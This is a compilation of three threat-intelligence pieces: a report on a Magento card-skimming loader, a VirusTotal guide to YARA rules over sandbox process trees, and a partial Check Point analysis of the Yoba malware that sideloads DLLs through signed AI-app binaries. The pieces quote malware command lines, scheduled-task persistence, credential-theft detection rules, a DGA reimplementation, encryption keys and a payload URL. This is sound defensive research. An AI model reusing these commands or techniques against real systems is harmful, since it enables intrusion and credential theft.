Attackers have infected 953 online stores, mostly running Magento, with a JavaScript loader that has evolved to tell security scanners apart from real shoppers.

The campaign has been active since July 2025 and has cycled through five loader domains, according to research from Dutch e-commerce security firm Sansec. Its latest domain, registered October 6, was found in the content management system (CMS) blocks of 83 stores, 60 of which had carried an earlier version of the loader.

The loader is stored in Magento's cms_block database table and has visitors' browsers fetch instructions from the attackers. Sansec said the server first works out whether a request comes from a genuine customer or a security scanner, and gives scanners nothing.

Latest Loader Filters Security Scanners

Before October, the operator relied on the Keitaro traffic distribution system to choose, for each visitor, between delivering a payload, redirecting the browser and returning nothing.

The loader Sansec first found on October 7 instead called the new domain directly and replayed code saved in the browser, so anyone served the payload would rerun it on later page loads, even with the domain down or blocked.

An October 23 rewrite added browser fingerprinting, checking for signs of browser automation and collecting hardware details, screen size, time zone and language before the server chose its response.

When scanning service urlscan.io loaded an infected store in an automated browser, Sansec found no injected content. The company has yet to obtain the final payload, so the campaign's ultimate purpose remains unclear.

Read more on malicious JavaScript in online stores: Global Magecart Campaign Targets Six Card Networks

Patches Did Not Always Stop Reinfection

Sansec said a March wave planted the loader on 471 stores within an hour, using webshells placed through PolyShell (CVE-2026-48356). Among 169 infected Magento 2 installations lacking at least one core patch, 102 showed evidence of file uploads via PolyShell or SessionReaper (CVE-2025-54236).

Patching alone did not prevent reinfection. A fully patched store running Magento 2.4.7-p10 picked up the newest loader on October 23, an hour after passing a clean scan. Sansec had spotted a rogue admin account and a GSocket backdoor on the store in September.

Sansec advised merchants to look for the loader in CMS content, review admin accounts and hunt for backdoors, rotate database, admin and integration credentials once the store is clean and apply the latest Magento and Adobe Commerce security updates.

It warned that removing the script leaves an attacker's write access to the database intact, so a compromised store can be reinfected while the original way in remains.

Attacks, Breaches & Threat Intel.title: Process trees in Livehunt: YARA rules that know who launched what
Attacks, Breaches & Threat Intel.context: For a lot of detections that is the whole point: PowerShell on its own is noise, PowerShell launched by mshta
Attacks, Breaches & Threat Intel.full_text:
Note: YARA-X v1.21.0 adds a parent_name field to the items in vt.behaviour.processes_list, and v1.22.0 adds ancestor_names. VirusTotal now fills that list for every sandbox report that includes a process tree, by flattening it. The result is one entry per process, and each entry knows the name of the process that created it and of the processes above it. Read the YARA-X blog.

If you have written Livehunt rules on top of sandbox behavior, you have probably used vt.behaviour.processes_created. It is a flat list of command lines. It tells you that mshta.exe ran and that powershell.exe ran, but not that one started the other. For a lot of detections that is the whole point: PowerShell on its own is noise, PowerShell launched by mshta.exe is not.

Our sandboxes have always recorded the full process tree. The problem was getting it into YARA, which has no recursive types. As of this month, every file with sandbox reports that reaches Livehunt carries vt.behaviour.processes_list: one entry per process, from every sandbox that ran the file, and each entry knows the name of its parent, the names of its ancestors, and the files it touched.

This post covers what is in each entry, what to keep in mind when writing rules against it, and five cases we worked through while preparing it, each with the rules we wrote and tested. Every case comes with at least one hash, so you can paste the rule in the Livehunt editor and test it yourself.

If you haven't read it yet, we recommend our earlier post It's all about the structure! Creating YARA rules by clicking. It shows how to open the Structure view of any file in the Livehunt editor and turn fields into rule conditions with a click, which is handy for everything that follows.

What each process entry carries

Field

Type

What it holds

name

string

The process, as the sandbox reports it. Usually the image path plus the command line.

parent_name

string

The name of the process that created this one. Empty for root processes and when the parent is unknown.

ancestor_names

array of strings

The names of its ancestors, nearest first: ancestor_names[0] is the parent (the same as parent_name), ancestor_names[1] the grandparent, and so on. Empty for root processes and when the parent is unknown.

process_id / parent_process_id

string

PIDs, as reported by the sandbox.

start_time / termination_time

integer

When the process started and ended, if known.

files_written

array of strings

Files this process created or modified.

files_opened

array of strings

Files this process opened.

files_deleted

array of strings

Files this process deleted.

files_copied[x].source / .destination

string

Files this process copied, when the sandbox attributes copies to a process.

The fields that change how you write rules are parent_name, ancestor_names and the per-process file lists. With them, "PowerShell wrote a .dll" becomes "the PowerShell that cmd.exe started wrote a .dll".

The simplest possible rule looks like this:

import "vt" rule cmd_spawns_schtasks_create { condition: for any p in vt.behaviour.processes_list : ( p.name icontains "schtasks" and p.name icontains "/create" and p.parent_name icontains "cmd.exe" ) }

Things to know before you write rules

Names are not normalized. Each sandbox writes process names its own way. CAPE gives the quoted command line, Zenbox prepends the image path to the command line, Tencent HABO gives only the executable name, and C2AE and Microsoft Sysinternals often leave environment variables unexpanded (%ComSpec% /c ...). Use icontains and match on the executable name, not on a full path with == or startswith.

Link processes by name, not by PID. A file is usually run by several sandboxes, and Livehunt puts all their processes in the same list. PID 1040 can be cmd.exe in one report and explorer.exe in another. To go more than one level up, use ancestor_names: it is built from each sandbox report on its own, so a chain never mixes processes from different sandboxes. For long chains, you can also climb by name: look for the entry whose name is equal to the parent_name you already have. Both strings come from the same sandbox report, so an exact == is safe there.

A practical workflow is to search first and write the rule second. Intelligence search already supports behavior_processes:"<command line>", which matches anywhere in the list with no hierarchy. It is a quick way to collect candidates. Then you write the rule with the parent condition, and test it against those hashes in the Livehunt editor.

Case 1: porting a Sigma rule, and what it misses

Sigma's Suspicious MSHTA Child Process (03cc0c25-389f-4bf8-b48d-11878079f1ca) is a good example of a detection that needs the parent. Stripped down, it says: the parent image ends with \mshta.exe and the child is a shell or a scripting host.

detection: selection_parent: ParentImage|endswith: '\mshta.exe' selection_child: - Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\pwsh.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\reg.exe' - '\regsvr32.exe' - '\bitsadmin.exe' condition: all of selection*

The Livehunt version maps ParentImage to parent_name and Image to name:

import "vt" rule mshta_spawns_shell { meta: description = "Port of Sigma 03cc0c25 (Suspicious MSHTA Child Process)" condition: for any p in vt.behaviour.processes_list : ( p.parent_name icontains "mshta.exe" and ( p.name icontains "cmd.exe" or p.name icontains "powershell" or p.name icontains "pwsh" or p.name icontains "wscript" or p.name icontains "cscript" or p.name icontains "bash.exe" or p.name icontains "reg.exe" or p.name icontains "regsvr32" or p.name icontains "bitsadmin" ) ) }

One thing does not carry over. Sigma also checks OriginalFileName to catch renamed binaries, and sandbox process names have no equivalent. A renamed mshta.exe will get past this rule.

We tested it against d30a0a6c09f664446943d82982f0630e85c447cbe84be8a74b6db6d66effbe80, an Excel file named NOVI USD 44570.00 952PLA3262852510.xls (18/76, tagged cve-2017-0199). It matches. What is more interesting is the CAPE process tree behind the match:

Process

Parent

EXCEL.EXE "...\attachment.xls" /dde

Explorer.EXE

mshta.exe -Embedding

svchost.exe -k DcomLaunch -p

cmd.exe "/c POwERSHeLl.Exe ... -EX BypaSS -nOp -w 1 -ec ..."

mshta.exe -Embedding

POwERSHeLl.Exe ... -ec ...

cmd.exe

WScript.exe "...\AppData\Roaming\westingcostringforme.vbe"

POwERSHeLl.Exe

powershell.exe -nop -ep bypass -file "C:\Temp\XBRYINEZ.ps1"

WScript.exe

aspnet_compiler.exe

powershell.exe -file ...XBRYINEZ.ps1

Excel is not the parent of mshta.exe. The exploit has Office request an object through DCOM, so mshta.exe is started by the DCOM launcher service, and it shows up with -Embedding. A rule that looks for "Office spawns mshta" would never fire on this document. What we can do is walk one level up from the shell and check the grandparent:

import "vt" rule dcom_mshta_spawns_shell { condition: for any p in vt.behaviour.processes_list : ( (p.name icontains "cmd.exe" or p.name icontains "powershell") and p.parent_name icontains "mshta.exe" and p.ancestor_names[1] icontains "svchost.exe" and p.ancestor_names[1] icontains "dcomlaunch" ) }

The first entry of ancestor_names is always the parent, so ancestor_names[1] is the grandparent: the process that started mshta.exe. Without it, you need a second loop over the list to find the entry whose name is the shell's parent_name, and one more loop for every extra level.

The same rule matches other spreadsheets from the same wave, for example 8d249972358268b7a00e182e3f1ecf93ec8bbbee65d22ef4d8a3c382783c1cfa (PO#3302-20260520002.xls), 2d199776cc50b9ad548132105e95af86b29ec8ebca03895a7ddecde58587306b (Request Quotation.xls) and 7c8a3c8366b3106db56359e3defc654d365ce4de21d0a7b1fbad02fbb2aeae52. The rest of that chain shows up again in cases 4 and 5.

Case 2: a services.exe that is not, and the copies behind it

On a normal Windows system, services.exe is started by wininit.exe and by nothing else. A services.exe with any other parent deserves a look:

import "vt" rule fake_services_wrong_parent { condition: for any p in vt.behaviour.processes_list : ( p.name iendswith "\\services.exe" and p.parent_name != "" and not p.parent_name icontains "wininit.exe" ) }

The parent_name != "" check matters. In the reports we looked at, the real services.exe shows up as a root process with no parent, and we don't want those to match.

Our first version also covered lsass.exe. We tested it against 43 recent, clean, signed files, and it matched 19 of them. In those reports the sandbox records lsass.exe with services.exe as its parent. Whatever the reason, that is what the data says, so we dropped lsass.exe from the rule. The lesson is a general one: before encoding what the parent "should" be, check what the sandboxes actually report for clean files.

The rule matches fe8357febe314becf31510a7a2ecb0369e312ad58a448292f5f8a09075d7694c, a .NET executable (45/76) submitted as Cd5KK.exe. In the Jujubox report, Cd5KK.exe starts C:\Windows\System32\NlsLexicons0c1a\services.exe. That process writes two .vbs files to %TEMP% and runs each one with WScript.exe, and one of the scripts starts the fake services.exe again. The sample also launches one PowerShell per path to add Defender exclusions, and in the CAPE report it creates ONLOGON scheduled tasks through WMI, with wmiprvse.exe as the parent of schtasks.exe.

Where did the fake services.exe come from? Jujubox does not attribute file copies to a process, but it does report them at the summary level, in vt.behaviour.files_copied. Cd5KK.exe copied itself to eight places, each one with the name of a Windows binary:

C:\Windows\System32\NlsLexicons0c1a\services.exe C:\System Volume Information\services.exe C:\Windows\system\smss.exe C:\Windows\System32\mfc42\taskeng.exe C:\Users\Default User\WmiPrvSE.exe C:\Program Files\Common Files\System\ado\en-US\WmiPrvSE.exe C:\PerfLogs\Admin\sysmon.exe C:\Users\<USER>\Downloads\patchregistry\event-stream.exe

You can combine both fields. This rule looks for a copy named after a system process, and then for a process in the list that runs from exactly that path and has a parent:

import "vt" rule copy_with_system_name_is_executed { condition: for any c in vt.behaviour.files_copied : ( ( c.destination iendswith "\\services.exe" or c.destination iendswith "\\smss.exe" or c.destination iendswith "\\lsass.exe" or c.destination iendswith "\\csrss.exe" or c.destination iendswith "\\svchost.exe" or c.destination iendswith "\\wmiprvse.exe" or c.destination iendswith "\\taskhostw.exe" or c.destination iendswith "\\conhost.exe" ) and for any p in vt.behaviour.processes_list : ( p.name icontains c.destination and p.parent_name != "" ) ) }

The copy proves the file was planted, and the process entry proves it ran. We tested the rule against 30 recent files with a services.exe path in their Jujubox file activity: it matched 9 of them, among them 4930cc4e7e3e258bf2815793f0e5698bdd45adfae8e052bb1dc4c05c6689ade6, which shares the trojan.msil/basic label with Cd5KK.exe and also matches the services.exe parent rule above. It did not match any of the 43 clean files.

Case 3: headless consoles, renamed or not

conhost.exe --headless runs a console program without showing a window. Sigma has a rule that looks for --headless and powershell in the conhost.exe command line. With the parent available, we can ask a slightly different question: did a PowerShell process actually start with a headless console as its parent?

import "vt" rule headless_console_runs_powershell { condition: for any p in vt.behaviour.processes_list : ( (p.name icontains "powershell" or p.name icontains "pwsh") and p.parent_name icontains "--headless" ) }

A plain search shows why a rule on the command line alone gets noisy. behavior_processes:"conhost.exe --headless" fs:2026-09-01+ returned 947 files when we ran it. Part of that is legitimate software. Terminal emulators use pseudo-consoles, which start conhost.exe --headless --inheritcursor ... --server .... herdr.exe (c18555a6bb74cd021198b57d16b93b40e74e7d0f8f0c28a45f0a4cc22dea0f8b, 0/76) does exactly that, and the rule above does not match it, because that conhost.exe never starts a shell.

On the malicious side, 5c2ceaec797dfa79e81cde6d765898ee8102357e280fa322db6e5a4b0ce3fc4a is a Windows shortcut with a Korean-language lure about penalty guidelines for e-commerce law violations, named with a double .hwp.lnk extension (34/76). CAPE and Jujubox both show the same chain: opening the shortcut starts conhost.exe --headless powershell.exe -NoP -exec BYpass -w 1 -C $rukp = '...', and that console starts the PowerShell that runs the Base64 blob. The decoded script opens with a function called Invoke-EnvironmentCheck.

Notice that the rule checks for --headless in the parent, not for conhost.exe. That is deliberate. 77da8a02d71078564409863c358a544e981b9643c8f50c1daabc5d5d176e3c75 (42/76) drops a file called rhpmx63snl.exe into %APPDATA%\MicrosoftWorker_e08ec640d\. That file is 51bb5aeef2e48dd14fae764f80dc67f516df9914ea9c350329e229f6cea919a2, an unmodified Microsoft conhost.exe (original name CONHOST.EXE, 0/77) with a random name. It later runs as rhpmx63snl.exe --headless powershell.exe -w h -ep bypass -c & "...\xd24mgasgb4.exe". A rule that required conhost.exe in the parent would miss it. If you only want the renamed case, add not p.parent_name icontains "conhost".

Case 4: persistence that actually ran

Spotting schtasks /create is easy. Knowing whether the task did anything during the analysis is harder, and the process list can answer it. When a scheduled task fires, the new process has the Task Scheduler service as its parent (svchost.exe -k netsvcs -p -s Schedule, or taskeng.exe on older systems). If that process runs a file the sample wrote earlier, the persistence worked.

import "vt" rule task_scheduler_runs_dropped_file { condition: for any run in vt.behaviour.processes_list : ( ( run.parent_name icontains "-s schedule" or run.parent_name icontains "taskeng.exe" ) and for any dropper in vt.behaviour.processes_list : ( for any f in dropper.files_written : ( (f iendswith ".exe" or f iendswith ".dll" or f iendswith ".vbs" or f iendswith ".js" or f iendswith ".ps1" or f iendswith ".bat" or f iendswith ".cmd") and run.name icontains f ) ) ) }

This is the first rule in the post that uses files_written, and it uses it to link two processes that are not parent and child: the one that wrote the file, and the one the scheduler started from it.

Back to 77da8a02d71078564409863c358a544e981b9643c8f50c1daabc5d5d176e3c75. In the CAPE report, software.exe writes rhpmx63snl.exe and xd24mgasgb4.exe to %APPDATA%\MicrosoftWorker_e08ec640d\, and then runs:

schtasks.exe /create /sc minute /mo 1 /tn "AdobeSecurityManager" /tr "C:\Users\<USER>\AppData\Roaming\MicrosoftWorker_e08ec640d\rhpmx63snl.exe --headless powershell.exe -w h -ep bypass -c & '...\xd24mgasgb4.exe'"

When the task fires, the scheduler starts rhpmx63snl.exe (the renamed conhost.exe from case 3), which starts PowerShell, which starts xd24mgasgb4.exe. Every link in that sentence is a parent_name, and the rule matches. The whole chain is also in the ancestor_names of xd24mgasgb4.exe: the PowerShell, rhpmx63snl.exe, the Schedule service and services.exe.

Zenbox saw the same task fire, but reported rhpmx63snl.exe as a root process with no parent. That is fine: CAPE has the link, and the rule only needs one sandbox to see it. It also shows why you shouldn't write rules that need every sandbox to agree.

One more format issue we ran into. a549a6c8c01da1d03e8da663eec70997a5bd5207e665d8e23f6fa75804dafc06, a VBS file we use in the next case, also creates a task that fires during the VMRay analysis, with taskeng.exe as the parent. The rule misses it, because VMRay logged that command line with doubled backslashes (C:\\Users\\Public\\Downloads\\PoItWjNFjv.vbs), so the path in files_written is not a substring of the process name. When a rule should match and does not, check the raw strings first. Here ancestor_names gives a check that does not depend on how paths are written: the task runs wscript.exe with the dropped script, the script starts PowerShell, and taskeng.exe is among that PowerShell's ancestors. A PowerShell process with for any a in p.ancestor_names : (a icontains "taskeng.exe") catches it.

Case 5: .NET binaries reading browser credentials

Loaders often inject the final payload into a signed .NET Framework binary such as MSBuild.exe, RegAsm.exe, RegSvcs.exe, InstallUtil.exe or aspnet_compiler.exe. On their own, these processes are normal on a developer machine. Started by PowerShell or a scripting host, and writing temporary copies of browser credential databases, they are not.

import "vt" rule dotnet_lolbin_touches_browser_logins { condition: for any p in vt.behaviour.processes_list : ( ( p.name icontains "aspnet_compiler.exe" or p.name icontains "regasm.exe" or p.name icontains "regsvcs.exe" or p.name icontains "msbuild.exe" or p.name icontains "installutil.exe" or p.name icontains "addinprocess" ) and for any a in p.ancestor_names : ( a icontains "powershell" or a icontains "wscript" or a icontains "cscript" or a icontains "mshta" ) and for any f in p.files_written : ( f icontains "\\User Data\\" and (f icontains "\\Login Data" or f icontains "\\Web Data" or f icontains "\\Cookies") ) ) }

All three conditions apply to the same process: what it is, what is above it, and what it wrote. That is the difference from the flat fields. behaviour_files:"Login Data" together with behavior_processes:"MSBuild.exe" can match a file where those two things happened in unrelated processes.

The rule matches a549a6c8c01da1d03e8da663eec70997a5bd5207e665d8e23f6fa75804dafc06, a VBS file named RFQ_638O-0194RFQ26_202610070614034439RFQ.vbs (14/76). In the CAPE report, a hidden PowerShell that rebuilds its script from environment variables is started through WMI (its parent is wmiprvse.exe), and that PowerShell starts MSBuild.exe, which writes ...\Google\Chrome\User Data\Default\Login Data.tmp and the matching -wal and -shm files. It also matches the Excel file from case 1, d30a0a6c09f664446943d82982f0630e85c447cbe84be8a74b6db6d66effbe80, where the last process in the chain, aspnet_compiler.exe, writes the same files. In that file, the ancestor_names of aspnet_compiler.exe go all the way back to the exploit: the PowerShell running XBRYINEZ.ps1, WScript.exe, the obfuscated PowerShell, cmd.exe and mshta.exe -Embedding.

Checking the ancestors instead of only the parent matters in 2d199776cc50b9ad548132105e95af86b29ec8ebca03895a7ddecde58587306b, the Request Quotation.xls from case 1. There, the process that writes the Chrome and Edge Login Data and Web Data files is a second aspnet_compiler.exe, started with /stext by the first one. Its parent is aspnet_compiler.exe, so a rule that only looks at parent_name misses it, while the PowerShell and WScript.exe above it are its second and third ancestors. On the 420 malicious and 324 clean files we used to measure ancestor_names, this version matched 5 malicious files that the parent-only version missed, and none of the clean ones.

Testing the rules

Everything in this post was tested two ways. First, against the hashes above and against a set of clean files, using the Livehunt rule tester. The tester rebuilds the vt module for the hash you give it, so it works for files analyzed before these fields existed. Second, in a live Livehunt ruleset with all the rules. Within a few minutes of enabling it we were already getting notifications for mshta_spawns_shell, dcom_mshta_spawns_shell, task_scheduler_runs_dropped_file and others. The ancestor_names versions of the rules were also run with YARA-X 1.22.0 against the same hashes and 324 clean files.

Wrapping up

A command line tells you what ran. Its parent and ancestors tell you how it got there, and the files it wrote tell you what it left behind. Rules that join the two are harder for a sample to sidestep, because the operator would need to change the chain, not just the strings. Open the vt module view of any file you are investigating, find the processes_list entry that bothers you, and write the rule from there.

Happy hunting!

Attacks, Breaches & Threat Intel.title: Tricks from the Past deployed via signed ChatGPT and Claude binaries
Attacks, Breaches & Threat Intel.context: Key Points Check Point Research discovered a campaign we track as Yoba where attackers abuse the popularity of AI tools such as ChatGPT and Claude, creating fake GitHub projects...
Attacks, Breaches & Threat Intel.full_text:
Key Points

Check Point Research discovered a campaign we track as Yoba where attackers abuse the popularity of AI tools such as ChatGPT and Claude, creating fake GitHub projects that pretend to be desktop applications like GPT-5.6 Sol, GPT-6 Astra, and Claude Opus.

The malware is placed next to legitimate, signed executables from OpenAI and Anthropic so it can be loaded indirectly, a technique commonly known as DLL sideloading, which is often used to bypass security protections.

This campaign demonstrates strong operational security (OPSEC) by avoiding dedicated command-and-control (C2) infrastructure and instead relying on Telegram, Tor, Catbox, and DNS over HTTPS (DoH).

The actor behind the campaign shows indicators that suggest Russian origins and appears to operate primarily in the UTC-4 time zone.

Introduction

Over the past two months, we have been tracking a campaign that abuses the popularity of AI tools such as ChatGPT and Claude to spread a custom malware chain we call Yoba. The attackers use fake GitHub projects that pretend to be AI desktop applications like GPT-5.6 Sol, GPT-6 Astra, and Claude Opus. These projects look convincing and use real GitHub infrastructure, which helps them appear legitimate to potential victims. The website exhibits search-targeted content and suspicious installer-delivery tactics consistent with an SEO-poisoning lure.

Inside the installers, there is a malicious component we refer to as the YobaDropper. This dropper includes another component, the YobaLoader, which is responsible for contacting attacker-controlled infrastructure and fetching the final payload. In this report, we describe how victims are lured to these fake projects, how the YobaDropper and YobaLoader work together, and how the attackers ultimately use this chain to run unwanted software on infected systems.

Figure 1 — GPT-6 Astra campaign, attack chain.

GitHub Repositories

The initial access occurred via malicious GitHub repositories. The projects were impersonating ChatGPT and Claude related models, more specifically GPT-5.6 Sol, GPT-6 Astra, and Claude Opus. No manipulation of fake engagement (stars/forks) was in place.

Figure 2 — GitHub repository.

Aside from the repositories, GitHub.io pages were used to describe the capabilities of the software, while the malware was hosted as a release.

Figure 3 — GitHub.io page with links to malicious release.

These phishing landing pages contain download links that point directly to the malicious ZIP releases hosted on GitHub.

Figure 4 — Claude Opus GitHub[.]io page.

While the repositories do not show signs of fake engagement (such as artificially inflated stars or forks) that would promote them within GitHub’s own search, they still appear among the top results on Google. This is most likely due to SEO poisoning, where the attackers optimize titles, descriptions, and hosting domains to make their malicious projects rank highly in external search engines.

Figure 5 — Google Search results.

Each repository uses a different email address (edwardcarlsonmkym[@]outlook[.]com, daxschneiderdjuu[@]outlook[.]com, and rioprestonlfyx[@]outlook[.]com), and the uploader appears to operate in UTC+4, UTC-4, and UTC+3 respectively. This inconsistency likely reflects a deliberate attempt to obscure the threat actor’s true operational timezone.

Repositories’ initial commits:

Repository: /gpt-5-6/sol-free-desktop ================================================== [2026-07-16T14:39:40Z] Author: gpt-5-6 tree aebceccb0f3303806c35a73da865b684594487c1 author gpt-5-6 <edwardcarlsonmkym@outlook.com> 1784212780 +0400 committer GitHub <noreply@github.com> 1784212780 +0400 Initial commit ================================================== Repository: /gpt-5-6/gpt-5-6.github.io ================================================== [2026-07-16T14:44:31Z] Author: gpt-5-6 tree 249dae41d64583a6a9ebcb60e3ad36d6216dd6e4 author gpt-5-6 <edwardcarlsonmkym@outlook.com> 1784213071 +0400 committer GitHub <noreply@github.com> 1784213071 +0400 Initial commit ================================================== Repository: /opus-5-0/opus-5-0.github.io ================================================== [2026-08-31T21:33:26Z] Author: opus-5-0 tree 46ae1f147cf70d4df1471f0e9df46b654d11fe9c author opus-5-0 <rioprestonlfyx@outlook.com> 1788212006 -0400 committer GitHub <noreply@github.com> 1788212006 -0400 Create readme.md ================================================== Repository: /gpt-6-astra/gpt-6-astra.github.io ================================================== [2026-09-04T22:56:13Z] Author: gpt-6-astra tree 028bfd4c1041dc1f030c9480a463366e6089e661 author gpt-6-astra <daxschneiderdjuu@outlook.com> 1788562573 +0300 committer GitHub <noreply@github.com> 1788562573 +0300 Initial commit ==================================================

Although the first repository was created around July 2026, the first two malicious releases were not uploaded until the end of August, and a third malicious release followed approximately five days later.

Release: /gpt-5-6/gpt-5-6.github.io/releases/tag/v5.6.0 [2026-08-30T19:15:44Z] gpt-5-6 Uploaded sol-setup.zip (application/zip) (269) ================================================== Release: /opus-5-0/opus-5-0.github.io/releases/tag/Release_v5.0.0 [2026-08-31T21:38:13Z] opus-5-0 uploaded Setup-Claude.zip (application/zip) (82) ================================================== Release: /gpt-6-astra/gpt-6-astra.github.io/releases/tag/Astra [2026-09-04T23:14:11Z] gpt-6-astra Uploaded GPT-6-Astra-Setup.zip (application/zip) (352)

Malicious zip files hosted on GitHub and other legitimate platforms are usually password-protected, since this prevents automated tools from unpacking and therefore analyzing them. However, neither of these repositories used password protection, as the binaries already had very low detection rates thanks to their anti-sandbox and other anti-analysis techniques.

Figure 6 — Low detection rate.

While the two ChatGPT-related releases and their repositories were created about five days apart, the ZIP files contain mostly the same files, including the malicious components, and they maintain the same IoCs.

The file that immediately stands out is winmm.dll, which was compiled the same day it was added to the ZIP archive. This suggests it is the component with the malicious functionality, while the other files serve to make the package appear legitimate. The compilation timestamp also indicates the actor is operating in the UTC-4 timezone.

Furthermore, Setup.exe, a legitimate signed OpenAI executable, is used during execution to sideload the malicious DLL. The Setup-Claude.zip file contains the same structure, though in this case Setup.exe is a legitimate signed Claude executable.

Figure 7 — Signed OpenAI and Anthropic binaries.

YobaDropper – winmm.dll

The malicious DLL contains multiple export names, suggesting that the legitimate winmm.dll has been spoofed. As in many other cases, these exports exist but their code has been stripped out, leaving them mostly empty and reducing the size of the binary.

Figure 8 — Stripped code from exports.

All 180 exports contain just a return instruction (C3) followed by NOPs (90), and DllEntryPoint is the only one containing actual code.

Anti-Analysis, Pre-Checks

The first function implements an anti-sandbox technique: the malware hashes the basename of its host executable and checks whether the checksum matches the hardcoded value 0xE6C2F326. The hashing algorithm has been identified as DJB2, which other malware families have also used in the past. The malware expects to run under the name Setup.exe, so this check fails if the DLL is executed on its own inside a sandbox environment.

Figure 9 — DJB2 algorithm and hash check.

Although a failed check does not terminate the process, the DLL performs 200,000 iterations of Sleep(5500), amounting to approximately 12.73 days, while repeatedly appending the decoded filler string pddy to a local UTF-16 buffer.

In the second function, the malware checks whether the infected user is located in a CIS country by inspecting the system’s keyboard layout. Ukraine was historically included in such checks, but it is not in the list used by recent malware.

The language check is unusual. Instead of comparing the victim’s keyboard language ID against hardcoded values, the malware checks whether the ID falls within the range 0x19–0x44. For IDs in that range, it tests the corresponding bit in the bitmask 0xEC0400C8401 to determine whether the language belongs to a CIS-region country, with an explicit exception for ID 0x22 (Ukrainian). Bazarloader has used a similar technique in the past, with the bitmask 0xD8080190C03.

Figure 10 — Language checks.

Language IDs excluded from the infection:

Russian

Belarusian

Tajik

Armenian

Azerbaijani

Georgian

Kazakh

Kyrgyz

Turkmen

Uzbek

Tatar

The malware continues to resolve Windows API functions dynamically from kernel32.dll and ntdll.dll by comparing hashes of the exported function names. The hashing algorithm is again DJB2, with the initial value 0x1505.

The last check before the malware unpacks and deploys the embedded payload tests whether the process is running with administrator privileges. If it is not, the malware displays the message “Please run this program as Administrator.” to the victim and terminates itself, requiring the user to rerun it with elevated privileges.

Deploying Phase

The dropper contains multiple XOR-encrypted strings that are decrypted when needed. These strings include the file paths where the embedded binaries are dropped, as well as the decryption keys.

It creates a directory under ProgramData named WMProcess. Then it copies the original WMPDMC.exe from System32 into this newly created folder. Next, it decrypts the embedded payload using the string IRANNUMBERONE as the XOR seed and drops the decrypted payload in the same folder under the name wmpdui.dll.

Using scheduled tasks, the dropper maintains persistence by leveraging the legitimate executable, which will sideload the malicious payload. To make the task appear legitimate, it sets the author to Microsoft Corporation and the description to Collects device metadata for Windows Media Player.. It also sets the boot-trigger delay to PT3M, which corresponds to a 3-minute delay after system startup, and configures the task to run under the Local System account (S-1-5-18).

YobaLoader – wmpdui.dll

The second-stage payload contains the same code as the dropper, which indicates that the same developer is responsible for both components.

The same anti-sandbox technique is used, forcing the malware to be run only by WMPDMC.exe. It again checks the hash of the process basename, and only continues execution if this value matches the hardcoded hash 0x552751E3.

The dropper uses the DJB2 hashing algorithm to hash and verify the process name and to resolve Windows API functions, both with the same seed 0x1505. The loader (YobaLoader) also uses DJB2 for the process name with the same seed as the dropper, but for resolving Windows API functions it uses a different seed, 0x1DEB.

Figure 11 — Hashing windows API functions.

The developer reused the same string-hashing algorithm but changed the seed (0x1505 in the dropper, 0x1DEB in the loader) to separate the hash spaces for each stage, complicating analysis, and reducing the effectiveness of hash-based detection and automated tooling.

Network

The downloader uses an interesting process to obtain the next-stage payload. It first decrypts multiple strings using a simple XOR operation, among these strings is the URL of a Telegram channel, t[.]me/yoba_fanclub. It then visits this channel using the user-agent string Mozilla/5.0 (Windows NT 10.0; Win64;) and parses the HTML source to extract the src URL of the element with the class tgme_page_photo_image. This class refers to the location where the channel’s profile image is hosted.

Figure 12 — Telegram channel.

It downloads the image and uses the last 50 bytes as a seed to generate a domain based on three lists of dictionary words, which are decrypted as part of the DGA algorithm. This DGA algorithm uses three sets of strings:

Adjectives

Nouns

Verbs

Finally, it generates and appends an integer value in the range 0–999. The generated domain has the following format, "$adjective-$noun-$verb-$digit.dedyn[.]io". By changing the image of the Telegram channel, a new domain can be generated.

The following Python snippet represents the DGA algorithm:

""" Author: @Tera0017/Check Point Research """ from pathlib import Path import sys ADJECTIVES = [ "silver", "amber", "wild", "tiny", "brave", "lucky", "calm", "sharp", "swift", "bright", "quiet", "bold", "gentle", "fierce", "royal", "mystic", "username", "degenerate", "allblack", "kizta", "graf", ] NOUNS = [ "tiger", "river", "stone", "cloud", "wolf", "ocean", "forest", "mountain", "eagle", "raven", "ember", "comet", "fox", "dragon", "piano", "viper", "yoba", "yyoba", "static", "cpp", "example", ] VERBS = [ "runs", "jumps", "sings", "sleeps", "flies", "hunts", "burns", "floats", "shines", "whispers", "roars", "dreams", "strikes", "glides", "watches", "hides", "duty", "free", ] FNV_MULTIPLIER = 0x1000193 MASK64 = 0xFFFFFFFFFFFFFFFF def hash_bytes(data: bytes, seed: int) -> int: value = seed for byte in data: value = ((value ^ byte) * FNV_MULTIPLIER) & MASK64 return value def generate_domain(image_path: str) -> str: image = Path(image_path).read_bytes() if len(image) < 50: raise ValueError("Image must contain at least 50 bytes") tail = image[-50:] adjective = ADJECTIVES[hash_bytes(tail, 0x811C9DC5) % len(ADJECTIVES)] noun = NOUNS[hash_bytes(tail, 0xAF0154A5) % len(NOUNS)] verb = VERBS[hash_bytes(tail, 0xFE5439E4) % len(VERBS)] number = hash_bytes(tail, 0xFFA7471A) % 1000 return f"{adjective}-{noun}-{verb}-{number}.dedyn[.]io" if __name__ == "__main__": image_file = sys.argv[1] print(generate_domain(image_file))

It then queries Google’s DNS-over-HTTPS (DoH) API to obtain an encrypted command from a DNS TXT record, using a URL of the form https://dns[.]google/resolve?name=$DGA&type=TXT.

By relying on a DoH service and common file-hosting platforms, the actor aims to bypass passive DNS monitoring and some gateway-based security protections, making their command-and-control traffic harder to distinguish from regular user activity.

Figure 13 — DNS TXT record, base64 encoded data.

It decodes the Base64-encoded data field from the JSON response and validates it using Ed25519 signature verification with the public key b5c2d20623d4e6647d06a42864edd8629f82c5c384b243fdaeeeca24b3873d64. Once the signature validation succeeds, it decrypts the decoded value using AES in ECB mode with the key 1d0d1368b4d53f3a6322cf40e84e63db.

Decrypted response: 1https://files.catbox[.]moe/z5zpy9.dat

The downloader retrieves the encrypted payload and decrypts it using the same AES key and ECB mode that were previously used for the DNS data.

The malware provides three methods for deploying the downloaded payload. The selected method is indicated by the first character of the decrypted response that follows the URL (1/2/3):

Injects the downloaded payload into svchost.exe (NtWriteVirtualMemory/NtCreateThreadEx). It enumerates running processes and, using the hashing algorithm with the seed 0x1DEB, searches for the hash value 0xC26CDEA5, which corresponds to svchost.exe.

Saves the payload as a %TEMP%\$10_rand_char\$10_rand_char.exe file and executes it. Before running the executable, the downloader removes the Zone.Identifier alternate data stream, which is hidden metadata used by Windows to track the origin of downloaded files.

